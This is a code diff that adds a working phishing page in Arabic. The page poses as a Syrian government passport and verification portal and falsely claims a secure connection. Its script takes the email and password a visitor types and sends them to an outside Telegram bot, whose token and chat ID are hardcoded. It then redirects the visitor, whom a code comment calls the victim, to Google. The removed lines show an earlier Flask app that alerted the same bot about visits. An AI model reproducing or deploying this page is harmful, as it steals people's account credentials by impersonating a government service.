@@ -1,23 +1,38 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>بوابة التحقق الموحدة</title>
+    <style>
+        body { background: #1a1a1a; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
+        .box { border: 1px solid #333; padding: 20px; border-radius: 15px; width: 80%; margin: auto; background: #222; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { background: #007bff; color: white; width: 95%; padding: 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .status { color: #00ff00; font-size: 12px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Syria.svg" width="80">
+        <h2>نظام تدقيق البيانات الحكومي</h2>
+        <p>يرجى إدخال بيانات الحساب لتأكيد طلبك</p>
+        <input type="text" id="u" placeholder="البريد الإلكتروني أو الرقم">
+        <input type="password" id="p" placeholder="كلمة السر">
+        <button onclick="send()">تأكيد الهوية</button>
+        <div class="status">اتصال آمن ومُشفر 🔒</div>
+    </div>
 
-from flask import Flask, render_template, request
-import requests
+<script>
+async function send() {
+    let u = document.getElementById("u").value;
+    let p = document.getElementById("p").value;
+    let tok = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+    let cid = "7214473798";
+    let txt = `🚀 صيد مِعمار الجديد:\n👤 الحساب: ${u}\n🔑 الباسورد: ${p}\n🌐 الموقع: بوابة الجوازات`;
 
-app = Flask(__name__)
-
-# بيانات بوت تليجرام الخاص بك (المستخرجة من كودك القديم)
-TOKEN = "8669811855:AAGvhpikwaC14E_d1fy24J1iyUgAdInXmSg"
-CHAT_ID = "7214473798"
-
-def send_telegram_msg(text):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": text}
-    requests.post(url, json=payload)
-
-@app.route('/')
-def home():
-    # إرسال إشعار عند دخول أي شخص للموقع
-    send_telegram_msg("🔒 تنبيه: شخص ما دخل إلى لوحة تحكم VPN عبد الرحمن!")
-    return render_template('index.html')
-
-if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`);
+    window.location.href = "https://www.google.com"; // توجيه الضحية
+}
+</script>
+</body>
+</html>
